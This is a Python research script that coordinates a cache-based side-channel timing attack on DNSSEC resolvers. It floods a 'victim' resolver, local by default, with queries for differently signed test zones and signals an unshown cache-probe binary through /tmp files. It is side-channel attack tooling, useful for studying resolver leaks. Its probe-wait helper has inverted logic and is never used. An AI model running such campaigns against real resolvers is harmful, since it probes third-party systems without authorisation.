#!/usr/bin/env python3
"""
trigger_attack.py - DNS trigger coordination for cache-based DNSSEC timing attack

This script coordinates the cache-based side-channel attack by:
1. Sending DNS queries to a victim resolver for specific algorithm-signed zones
2. Signaling the cache probe tool (cache_probe.c) when to measure
3. Collecting timing data for ML-based algorithm classification

Architecture:
    This script runs on the attacker side, sending DNS queries to the victim
    resolver and coordinating with cache_probe.c via filesystem-based IPC.

Usage:
    # Run full attack campaign
    python trigger_attack.py --resolver 127.0.0.1 --port 15354 --rounds 1000 \
        --algorithms rsa,ecdsa,ed25519 --output results_cache/

    # Single algorithm measurement
    python trigger_attack.py --resolver 127.0.0.1 --port 15354 --algorithm rsa --rounds 500

    # With external cache probe
    python trigger_attack.py --trigger /tmp/trigger --done /tmp/done --rounds 1000

Requirements:
    pip install dnspython numpy scipy scikit-learn

Author: DNSSEC Timing Research
License: Research use only
"""

import argparse
import os
import sys
import time
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import dns.resolver

# Zone configuration - matches docker-compose services
ZONE_CONFIG = {
    "rsa": {
        "zone": "test-valid-rsa.example",
        "domain": "www.test-valid-rsa.example",
        "algorithm": "RSASHA256",
        "port": 15354,
    },
    "ecdsa": {
        "zone": "test-valid-ecdsa.example",
        "domain": "www.test-valid-ecdsa.example",
        "algorithm": "ECDSAP256SHA256",
        "port": 15354,
    },
    "ed25519": {
        "zone": "test-valid-ed25519.example",
        "domain": "www.test-valid-ed25519.example",
        "algorithm": "ED25519",
        "port": 15354,
    },
}


class TriggerAttack:
    """Coordinates DNS queries with cache probe measurements."""

    def __init__(
        self,
        resolver: str = "127.0.0.1",
        port: int = 15354,
        trigger_file: str = "/tmp/cache_trigger",
        done_file: str = "/tmp/cache_done",
        output_dir: str = "results_cache",
    ):
        self.resolver = resolver
        self.port = port
        self.trigger_file = trigger_file
        self.done_file = done_file
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # DNS resolver configuration
        self.dns_resolver = dns.resolver.Resolver()
        self.dns_resolver.nameservers = [resolver]
        self.dns_resolver.port = port
        self.dns_resolver.timeout = 5
        self.dns_resolver.lifetime = 5

        # Statistics
        self.stats = {
            "total_queries": 0,
            "successful": 0,
            "failed": 0,
            "timeouts": 0,
        }

    def send_dns_query(self, domain: str, record_type: str = "A") -> Optional[float]:
        """
        Send a DNS query and measure response time.

        Returns:
            Response time in milliseconds, or None on failure.
        """
        try:
            start = time.perf_counter()
            answer = self.dns_resolver.resolve(domain, record_type)
            end = time.perf_counter()

            self.stats["total_queries"] += 1
            self.stats["successful"] += 1

            return (end - start) * 1000  # Convert to ms

        except dns.resolver.NXDOMAIN:
            self.stats["total_queries"] += 1
            self.stats["successful"] += 1
            return None
        except dns.resolver.NoAnswer:
            self.stats["total_queries"] += 1
            self.stats["successful"] += 1
            return None
        except dns.exception.Timeout:
            self.stats["total_queries"] += 1
            self.stats["timeouts"] += 1
            return None
        except Exception as e:
            self.stats["total_queries"] += 1
            self.stats["failed"] += 1
            return None

    def signal_trigger(self):
        """Signal cache probe that validation is starting."""
        Path(self.trigger_file).touch()

    def wait_for_probe(self, timeout: float = 10.0) -> bool:
        """Wait for cache probe to complete."""
        start = time.time()
        while time.time() - start < timeout:
            if not os.path.exists(self.done_file):
                return True
            time.sleep(0.001)
        return False

    def clear_sync_files(self):
        """Remove synchronization files."""
        for f in [self.trigger_file, self.done_file]:
            if os.path.exists(f):
                os.remove(f)

    def run_measurement_round(
        self, algorithm: str, round_num: int
    ) -> Optional[Dict]:
        """
        Run a single measurement round for a given algorithm.

        Returns:
            Dict with timing data, or None on failure.
        """
        config = ZONE_CONFIG.get(algorithm)
        if not config:
            print(f"[-] Unknown algorithm: {algorithm}")
            return None

        domain = config["domain"]

        # Clear any stale sync files
        self.clear_sync_files()

        # Wait for probe to be ready (done file exists)
        if os.path.exists(self.done_file):
            os.remove(self.done_file)

        # Small delay to let probe prepare
        time.sleep(0.001)

        # Send DNS query (this triggers victim's DNSSEC validation)
        query_time = self.send_dns_query(domain)

        # Signal that validation is happening
        self.signal_trigger()

        # Wait briefly for probe to capture
        time.sleep(0.005)

        return {
            "round": round_num,
            "algorithm": algorithm,
            "domain": domain,
            "query_time_ms": query_time,
            "timestamp": time.time(),
        }

    def run_campaign(
        self,
        algorithms: List[str],
        rounds_per_algorithm: int = 1000,
        inter_query_delay: float = 0.01,
    ) -> Dict[str, List[Dict]]:
        """
        Run a full measurement campaign across multiple algorithms.

        Returns:
            Dict mapping algorithm name to list of measurement results.
        """
        results = {alg: [] for alg in algorithms}

        print(f"[*] Starting cache-based attack campaign")
        print(f"[*] Resolver: {self.resolver}:{self.port}")
        print(f"[*] Algorithms: {', '.join(algorithms)}")
        print(f"[*] Rounds per algorithm: {rounds_per_algorithm}")
        print(f"[*] Total measurements: {len(algorithms) * rounds_per_algorithm}")

        total_rounds = len(algorithms) * rounds_per_algorithm
        completed = 0

        for algorithm in algorithms:
            print(f"\n[*] Measuring {algorithm}...")

            for r in range(rounds_per_algorithm):
                result = self.run_measurement_round(algorithm, r)
                if result:
                    results[algorithm].append(result)

                completed += 1
                if (r + 1) % 100 == 0:
                    print(
                        "    Progress: {}/{} ({:.1f}%)".format(
                            r + 1, rounds_per_algorithm,
                            100.0 * completed / total_rounds
                        )
                    )

                # Inter-query delay to avoid overwhelming resolver
                time.sleep(inter_query_delay)

        return results

    def save_results(self, results: Dict[str, List[Dict]]):
        """Save measurement results to CSV files."""
        import csv

        for algorithm, measurements in results.items():
            if not measurements:
                continue

            output_file = self.output_dir / f"trigger_{algorithm}.csv"
            with open(output_file, "w", newline="") as f:
                writer = csv.DictWriter(f, fieldnames=measurements[0].keys())
                writer.writeheader()
                writer.writerows(measurements)

            print(f"[*] Saved {len(measurements)} measurements to {output_file}")

    def print_stats(self):
        """Print campaign statistics."""
        print("\n--- Campaign Statistics ---")
        print(f"Total queries: {self.stats['total_queries']}")
        print(f"Successful: {self.stats['successful']}")
        print(f"Failed: {self.stats['failed']}")
        print(f"Timeouts: {self.stats['timeouts']}")
        if self.stats['total_queries'] > 0:
            success_rate = 100.0 * self.stats['successful'] / self.stats['total_queries']
            print(f"Success rate: {success_rate:.1f}%")


def run_with_external_probe(
    cache_probe_bin: str,
    resolver: str,
    port: int,
    algorithms: List[str],
    rounds: int,
    output_dir: str,
):
    """
    Run attack with external cache_probe.c binary.

    This launches cache_probe.c as a subprocess and coordinates
    filesystem-based IPC between the trigger and probe.
    """
    trigger_file = "/tmp/cache_trigger"
    done_file = "/tmp/cache_done"

    # Clear sync files
    for f in [trigger_file, done_file]:
        if os.path.exists(f):
            os.remove(f)

    # Build cache probe command
    probe_cmd = [
        cache_probe_bin,
        "--trigger", trigger_file,
        "--done", done_file,
        "--rounds", str(rounds * len(algorithms)),
        "--output", os.path.join(output_dir, "cache_timings.csv"),
    ]

    print(f"[*] Launching cache probe: {' '.join(probe_cmd)}")

    # Start cache probe process
    probe_proc = subprocess.Popen(
        probe_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    # Give probe time to initialize
    time.sleep(1)

    # Run trigger attack
    attack = TriggerAttack(
        resolver=resolver,
        port=port,
        trigger_file=trigger_file,
        done_file=done_file,
        output_dir=output_dir,
    )

    results = attack.run_campaign(algorithms, rounds_per_algorithm=rounds)
    attack.save_results(results)
    attack.print_stats()

    # Wait for probe to finish
    try:
        probe_proc.wait(timeout=30)
    except subprocess.TimeoutExpired:
        probe_proc.kill()
        print("[-] Cache probe timed out, killed")

    stdout, stderr = probe_proc.communicate()
    if stdout:
        print(f"[*] Probe stdout: {stdout.decode()}")
    if stderr:
        print(f"[*] Probe stderr: {stderr.decode()}")


def main():
    parser = argparse.ArgumentParser(
        description="DNS trigger for cache-based DNSSEC timing attack"
    )
    parser.add_argument(
        "--resolver", default="127.0.0.1",
        help="Victim resolver IP (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port", type=int, default=15354,
        help="Victim resolver port (default: 15354)"
    )
    parser.add_argument(
        "--algorithms", default="rsa,ecdsa,ed25519",
        help="Comma-separated list of algorithms to test"
    )
    parser.add_argument(
        "--algorithm", type=str,
        help="Single algorithm to test (overrides --algorithms)"
    )
    parser.add_argument(
        "--rounds", type=int, default=1000,
        help="Rounds per algorithm (default: 1000)"
    )
    parser.add_argument(
        "--output", default="results_cache",
        help="Output directory (default: results_cache)"
    )
    parser.add_argument(
        "--trigger", default="/tmp/cache_trigger",
        help="Trigger file path"
    )
    parser.add_argument(
        "--done", default="/tmp/cache_done",
        help="Done file path"
    )
    parser.add_argument(
        "--cache-probe",
        help="Path to cache_probe.c binary for external probe"
    )
    parser.add_argument(
        "--delay", type=float, default=0.01,
        help="Inter-query delay in seconds (default: 0.01)"
    )

    args = parser.parse_args()

    algorithms = [args.algorithm] if args.algorithm else args.algorithms.split(",")

    if args.cache_probe:
        # Run with external cache probe
        run_with_external_probe(
            cache_probe_bin=args.cache_probe,
            resolver=args.resolver,
            port=args.port,
            algorithms=algorithms,
            rounds=args.rounds,
            output_dir=args.output,
        )
    else:
        # Run trigger-only mode
        attack = TriggerAttack(
            resolver=args.resolver,
            port=args.port,
            trigger_file=args.trigger,
            done_file=args.done,
            output_dir=args.output,
        )

        results = attack.run_campaign(
            algorithms,
            rounds_per_algorithm=args.rounds,
            inter_query_delay=args.delay,
        )
        attack.save_results(results)
        attack.print_stats()


if __name__ == "__main__":
    main()
